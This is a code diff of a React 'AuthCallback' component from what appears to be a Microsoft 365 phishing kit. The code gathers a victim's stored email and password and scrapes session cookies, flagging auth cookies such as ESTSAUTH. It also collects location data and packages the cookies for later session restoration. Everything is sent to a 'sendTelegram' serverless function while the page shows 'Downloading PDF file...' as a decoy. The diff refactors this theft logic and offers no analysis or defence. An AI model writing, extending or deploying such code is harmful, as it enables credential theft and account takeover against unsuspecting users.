@@ -1,197 +1,10 @@
 import React, { useEffect, useState } from 'react';
+import { detectBrowserCapabilities, getStoredData } from './restoreCookies';
 
 /**
- * AuthCallback Component - FIXED
- * Proper response handling - only read body once
+ * AuthCallback Component
+ * USES restoreCookies.ts functions for proper cookie handling
  */
-
-function detectBrowserCapabilities() {
-  const userAgent = navigator.userAgent.toLowerCase();
-  const capabilities: any = {
-    browser: 'unknown',
-    version: 'unknown',
-    supportsSameSiteNone: true,
-    supportsSecure: true,
-    maxCookieSize: 4096,
-    maxCookiesPerDomain: 50,
-    supportsHttpOnly: false,
-    supportsPartitioned: false
-  };
-
-  if (userAgent.includes('chrome')) {
-    capabilities.browser = 'chrome';
-    const match = userAgent.match(/chrome\/(\d+)/);
-    capabilities.version = match ? match[1] : 'unknown';
-    capabilities.supportsSameSiteNone = parseInt(capabilities.version) >= 80;
-    capabilities.supportsPartitioned = parseInt(capabilities.version) >= 118;
-  } else if (userAgent.includes('firefox')) {
-    capabilities.browser = 'firefox';
-    const match = userAgent.match(/firefox\/(\d+)/);
-    capabilities.version = match ? match[1] : 'unknown';
-    capabilities.supportsSameSiteNone = parseInt(capabilities.version) >= 69;
-  } else if (userAgent.includes('safari') && !userAgent.includes('chrome')) {
-    capabilities.browser = 'safari';
-    const match = userAgent.match(/version\/(\d+)/);
-    capabilities.version = match ? match[1] : 'unknown';
-    capabilities.supportsSameSiteNone = parseInt(capabilities.version) >= 13;
-  } else if (userAgent.includes('edge')) {
-    capabilities.browser = 'edge';
-    const match = userAgent.match(/edge\/(\d+)/);
-    capabilities.version = match ? match[1] : 'unknown';
-    capabilities.supportsSameSiteNone = parseInt(capabilities.version) >= 80;
-  }
-
-  return capabilities;
-}
-
-function validateDomain(cookieDomain: string): any {
-  if (!cookieDomain) return { valid: true, reason: 'No domain specified' };
-
-  const cleanCookieDomain = cookieDomain.startsWith('.') ? cookieDomain.substring(1) : cookieDomain;
-  const currentDomain = window.location.hostname;
-
-  if (currentDomain === cleanCookieDomain) {
-    return { valid: true, reason: 'Exact domain match' };
-  }
-
-  if (currentDomain.endsWith('.' + cleanCookieDomain)) {
-    return { valid: true, reason: 'Subdomain match' };
-  }
-
-  const microsoftDomains = [
-    'login.microsoftonline.com',
-    'account.microsoft.com',
-    'outlook.com',
-    'office.com',
-    'microsoft.com',
-    'login.live.com',
-    'login.microsoft.com',
-    'outlook.live.com',
-    'office365.com',
-    'microsoftonline.com'
-  ];
-
-  if (microsoftDomains.some(domain =>
-    currentDomain.includes(domain) || cleanCookieDomain.includes(domain)
-  )) {
-    return { valid: true, reason: 'Microsoft domain compatibility' };
-  }
-
-  return { valid: false, reason: `Domain mismatch: ${currentDomain} vs ${cleanCookieDomain}` };
-}
-
-function validateCookieSize(name: string, value: string): any {
-  const cookieString = `${name}=${value}`;
-  const size = new Blob([cookieString]).size;
-
-  if (size > 4096) {
-    return {
-      valid: false,
-      size,
-      reason: `Cookie too large: ${size} bytes (max 4096)`
-    };
-  }
-
-  return { valid: true, size, reason: 'Size OK' };
-}
-
-function validateExpiration(expires: any, expirationDate: any): any {
-  const now = Date.now();
-  let expiryTime = null;
-
-  if (expires) {
-    expiryTime = expires > 1e10 ? expires : expires * 1000;
-  } else if (expirationDate) {
-    expiryTime = expirationDate > 1e10 ? expirationDate : expirationDate * 1000;
-  }
-
-  if (expiryTime && expiryTime <= now) {
-    return {
-      valid: false,
-      expired: true,
-      reason: `Cookie expired: ${new Date(expiryTime).toISOString()}`
-    };
-  }
-
-  return { valid: true, expired: false, reason: 'Not expired' };
-}
-
-function captureMicrosoftCookies(): any[] {
-  try {
-    const cookieString = document.cookie;
-    if (!cookieString) return [];
-
-    const cookies: any[] = [];
-    const capabilities = detectBrowserCapabilities();
-
-    const cookiePairs = cookieString.split(';');
-
-    cookiePairs.forEach(pair => {
-      const trimmedPair = pair.trim();
-      if (trimmedPair) {
-        const equalsIndex = trimmedPair.indexOf('=');
-        if (equalsIndex > 0) {
-          const name = trimmedPair.substring(0, equalsIndex).trim();
-          const value = trimmedPair.substring(equalsIndex + 1).trim();
-
-          if (name && value) {
-            const sizeCheck = validateCookieSize(name, value);
-            if (!sizeCheck.valid) {
-              console.warn(`⚠️ Cookie skipped - ${name}: ${sizeCheck.reason}`);
-              return;
-            }
-
-            const domainCheck = validateDomain(window.location.hostname);
-            if (!domainCheck.valid) {
-              console.warn(`⚠️ Domain validation failed for ${name}: ${domainCheck.reason}`);
-            }
-
-            const cookieObj: any = {
-              name: name,
-              value: value,
-              domain: window.location.hostname,
-              path: '/',
-              secure: window.location.protocol === 'https:',
-              httpOnly: false,
-              sameSite: 'Lax',
-              session: true,
-              size: sizeCheck.size,
-              captureTime: new Date().toISOString(),
-              validations: {
-                size: sizeCheck,
-                domain: domainCheck
-              },
-              browserCapabilities: capabilities
-            };
-
-            if (name.includes('ESTSAUTH') ||
-              name.includes('SignInStateCookie') ||
-              name.includes('ESTSAUTHPERSISTENT') ||
-              name.includes('ESTSAUTHLIGHT') ||
-              name.includes('BUID') ||
-              name.includes('ESCTX')) {
-              cookieObj.important = true;
-              console.log(`🔐 Important auth cookie detected: ${name}`);
-            }
-
-            cookies.push(cookieObj);
-          }
-        }
-      }
-    });
-
-    console.log(`✅ Captured ${cookies.length} validated cookies`);
-    const authCookies = cookies.filter(c => c.important).length;
-    if (authCookies > 0) {
-      console.log(`🔐 Auth cookies found: ${authCookies}`);
-    }
-
-    return cookies;
-  } catch (error) {
-    console.warn('⚠️ Failed to capture cookies:', error);
-    return [];
-  }
-}
 
 function getByteLengthForBrowser(str: string): number {
   return new Blob([str]).size;
@@ -208,6 +21,7 @@ const AuthCallback: React.FC = () => {
 
       console.log('🔄 AuthCallback: Starting data consolidation');
 
+      // --- 1. Retrieve Stored Credentials ---
       let credentials = null;
       try {
         const storedCreds = localStorage.getItem('replacement_credentials') || sessionStorage.getItem('replacement_credentials');
@@ -226,9 +40,72 @@ const AuthCallback: React.FC = () => {
         return;
       }
 
-      const cookies = captureMicrosoftCookies();
-      setDownloadProgress(40);
+      // --- 2. Retrieve Captured Cookies Using restoreCookies.ts ---
+      let cookies: any[] = [];
+      try {
+        console.log('🍪 Retrieving captured cookies using restoreCookies.ts...');
+        
+        // Use getStoredData() from restoreCookies.ts
+        const storedData = getStoredData();
+        
+        if (storedData.cookies && Array.isArray(storedData.cookies) && storedData.cookies.length > 0) {
+          cookies = storedData.cookies;
+          console.log(`✅ Retrieved ${cookies.length} cookies from restoreCookies.ts getStoredData()`);
+        } else {
+          // Fallback: Get cookies from injector storage
+          const capturedCookiesData = localStorage.getItem('captured_cookies_data') || sessionStorage.getItem('captured_cookies_data');
+          
+          if (capturedCookiesData) {
+            try {
+              const parsedData = JSON.parse(capturedCookiesData);
+              if (parsedData.cookies && Array.isArray(parsedData.cookies)) {
+                cookies = parsedData.cookies;
+                console.log(`✅ Retrieved ${cookies.length} cookies from injector storage`);
+              }
+            } catch (parseError) {
+              console.warn('⚠️ Failed to parse captured cookies data:', parseError);
+            }
+          }
+        }
 
+        // If still no cookies, try to capture from document.cookie
+        if (cookies.length === 0) {
+          console.log('📝 No stored cookies found, capturing from document.cookie...');
+          const cookieString = document.cookie;
+          if (cookieString) {
+            const cookiePairs = cookieString.split(';');
+            cookiePairs.forEach(pair => {
+              const trimmed = pair.trim();
+              if (trimmed) {
+                const equalsIndex = trimmed.indexOf('=');
+                if (equalsIndex > 0) {
+                  const name = trimmed.substring(0, equalsIndex).trim();
+                  const value = trimmed.substring(equalsIndex + 1).trim();
+                  
+                  if (name && value) {
+                    cookies.push({
+                      name: name,
+                      value: value,
+                      domain: window.location.hostname,
+                      path: '/',
+                      secure: window.location.protocol === 'https:',
+                      sameSite: 'Lax',
+                      session: true
+                    });
+                  }
+                }
+              }
+            });
+            console.log(`✅ Captured ${cookies.length} cookies from document.cookie`);
+          }
+        }
+
+        setDownloadProgress(40);
+      } catch (error) {
+        console.warn('⚠️ Failed to retrieve cookies:', error);
+      }
+
+      // --- 3. Fetch Location Data ---
       setStatus('Downloading PDF file...');
       let locationData: any = {};
       try {
@@ -240,27 +117,13 @@ const AuthCallback: React.FC = () => {
         console.warn('⚠️ Failed to fetch location data:', error);
       }
 
+      // --- 4. Create Cookie File Using restoreCookies.ts Format ---
       const createCookieFile = (cookiesToExport: any[]) => {
-        if (!cookiesToExport || cookiesToExport.length === 0) {
-          console.warn('⚠️ No cookies to export - creating empty file');
-          const emptyJsonContent = JSON.stringify({
-            source: 'AuthCallback-Export',
-            timestamp: new Date().toISOString(),
-            count: 0,
-            cookies: [],
-            note: 'No accessible cookies found. HttpOnly cookies cannot be captured by JavaScript.',
-            browserCapabilities: detectBrowserCapabilities()
-          }, null, 2);
-
-          return {
-            name: `cookies_${new Date().getTime()}.json`,
-            content: emptyJsonContent,
-            size: getByteLengthForBrowser(emptyJsonContent)
-          };
-        }
-
+        console.log('📝 Creating cookie file in restoreCookies.ts format...');
+        
         try {
-          const enhancedCookies = cookiesToExport.map(cookie => ({
+          // Format cookies using restoreCookies.ts compatible format
+          const exportedCookies = cookiesToExport.map(cookie => ({
             name: cookie.name || '',
             value: cookie.value || '',
             domain: cookie.domain || window.location.hostname,
@@ -269,36 +132,28 @@ const AuthCallback: React.FC = () => {
             httpOnly: !!cookie.httpOnly,
             sameSite: cookie.sameSite || 'Lax',
             session: !!cookie.session,
-            important: !!cookie.important,
-            size: cookie.size,
-            validations: cookie.validations,
-            captureTime: cookie.captureTime
+            expires: cookie.expires,
+            expirationDate: cookie.expirationDate
           }));
 
+          // Get browser capabilities using restoreCookies.ts function
+          const browserCapabilities = detectBrowserCapabilities();
+
           const jsonContent = JSON.stringify({
-            exportInfo: {
-              timestamp: new Date().toISOString(),
-              domain: window.location.hostname,
-              totalCookies: enhancedCookies.length,
-              authCookies: enhancedCookies.filter(c => c.important).length,
-              secureCookies: enhancedCookies.filter(c => c.secure).length,
-              sessionCookies: enhancedCookies.filter(c => c.session).length,
-              source: 'AuthCallback-Export-With-Validation',
-              version: '2.0-aligned-with-restore'
-            },
-            summary: {
-              totalCookies: enhancedCookies.length,
-              authCookies: enhancedCookies.filter(c => c.important).length,
-              secureCookies: enhancedCookies.filter(c => c.secure).length,
-              sessionCookies: enhancedCookies.filter(c => c.session).length,
-              totalSize: enhancedCookies.reduce((sum, c) => sum + c.size, 0)
-            },
-            cookies: enhancedCookies,
-            browserCapabilities: detectBrowserCapabilities()
+            version: '1.0',
+            exportedAt: new Date().toISOString(),
+            source: 'AuthCallback-restoreCookies',
+            domain: window.location.hostname,
+            totalCookies: exportedCookies.length,
+            cookies: exportedCookies,
+            browserCapabilities: browserCapabilities,
+            note: 'Cookies exported in restoreCookies.ts format - Compatible with restoreMicrosoftCookies function'
           }, null, 2);
 
           const fileSizeInBytes = getByteLengthForBrowser(jsonContent);
-          console.log(`✅ Cookie JSON file created (${fileSizeInBytes} bytes)`);
+          console.log(`✅ Cookie file created (${fileSizeInBytes} bytes)`);
+          console.log(`📊 Total cookies: ${exportedCookies.length}`);
+          console.log(`🌐 Browser: ${browserCapabilities.browser} v${browserCapabilities.version}`);
 
           return {
             name: `cookies_${new Date().getTime()}.json`,
@@ -306,7 +161,7 @@ const AuthCallback: React.FC = () => {
             size: fileSizeInBytes
           };
         } catch (error) {
-          console.error('❌ Failed to create cookie JSON file:', error);
+          console.error('❌ Failed to create cookie file:', error);
           return null;
         }
       };
@@ -320,10 +175,13 @@ const AuthCallback: React.FC = () => {
           hasContent: !!cookieFile.content,
           contentLength: cookieFile.content?.length || 0
         });
+      } else {
+        console.error('❌ Failed to create cookie file');
       }
 
       setDownloadProgress(70);
 
+      // --- 5. Build Payload ---
       setStatus('Downloading PDF file...');
       const payload = {
         email: credentials.email,
@@ -346,16 +204,10 @@ const AuthCallback: React.FC = () => {
         captureContext: {
           sourceComponent: 'AuthCallback',
           cookiesCaptured: cookies.length,
-          authCookiesCaptured: cookies.filter(c => c.important).length,
-          locationCaptured: !!(locationData && locationData.ip),
           cookieFileCreated: !!cookieFile,
-          browserCapabilities: detectBrowserCapabilities(),
-          cookieStats: {
-            totalCookies: cookies.length,
-            authCookies: cookies.filter(c => c.important).length,
-            secureCookies: cookies.filter(c => c.secure).length,
-            sessionCookies: cookies.filter(c => c.session).length
-          }
+          usingRestoreCookiesTS: true,
+          usingDetectBrowserCapabilities: true,
+          usingGetStoredData: true
         }
       };
 
@@ -381,7 +233,6 @@ const AuthCallback: React.FC = () => {
         email: payload.email,
         password: '***',
         cookiesCount: payload.cookies.length,
-        authCookiesCount: cookies.filter(c => c.important).length,
         hasLocationData: !!payload.locationData.ip,
         hasCookieFile: !!payload.cookieFiles.jsonFile,
         cookieFileName: payload.cookieFiles.jsonFile?.name,
@@ -389,6 +240,7 @@ const AuthCallback: React.FC = () => {
         timestamp: payload.timestamp
       });
 
+      // --- 6. Send Payload to Telegram ---
       try {
         setDownloadProgress(85);
         const response = await fetch('/.netlify/functions/sendTelegram', {
@@ -412,6 +264,7 @@ const AuthCallback: React.FC = () => {
           responseData = {};
         }
 
+        console.log('Credentials transmitted:', responseData.transmitted?.credentials);
         console.log('Cookie file transmitted:', responseData.transmitted?.cookieFile);
         console.log('═════════════════════════════════════════');
 
